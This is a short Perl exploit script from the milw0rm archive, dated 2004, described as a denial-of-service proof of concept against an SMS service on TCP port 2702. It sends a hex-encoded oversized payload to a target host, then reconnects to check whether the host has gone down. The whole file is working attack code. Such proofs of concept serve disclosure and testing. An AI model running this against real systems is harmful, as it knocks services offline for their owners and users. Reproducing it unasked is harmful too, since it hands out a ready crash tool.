#!/usr/bin/perl

#############################
#
# SMS DOS proof of concept and test code
#
#############################

use Socket;
use IO::Socket;

if (@ARGV != 1)
{
print "usage: $0 <host or ip>\n";
exit;
}

$host = shift(@ARGV);

$hexmsg = converthex("5243483016004000524348455858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858");

print "\nCreating socket for connection to: $host\n\n";

my $sock1 = IO::Socket::INET->new (PeerAddr => $host, PeerPort => "(2702)", Proto
=> "tcp") or die("Could not create socket: $!\n");

$sock1->autoflush(1);

print $sock1 "$hexmsg";

while (<$sock1>)
{
print;
}

print "\nPacket sent to $host (please wait) ...\n";

sleep(2);

print "Verifying status of $host ...\n";

sleep(2);

my $sock2 = IO::Socket::INET->new (PeerAddr => $host, PeerPort => '(2702)', Proto
=> 'tcp') or die("\nDOS was successful - $host is down ...\n");

print "\nAttempt was not successful. $host is still alive and responding ...\n";

close($sock1);
close($sock2);

#############################
# End main code, start subs
#############################

sub converthex
{
local ($l) = @_;
$l =~ s/([0-9a-f]{1,2})\s*/sprintf("%c",hex($1))/egi;

return $l;
}

#############################
# End code
#############################

# milw0rm.com [2004-07-24]
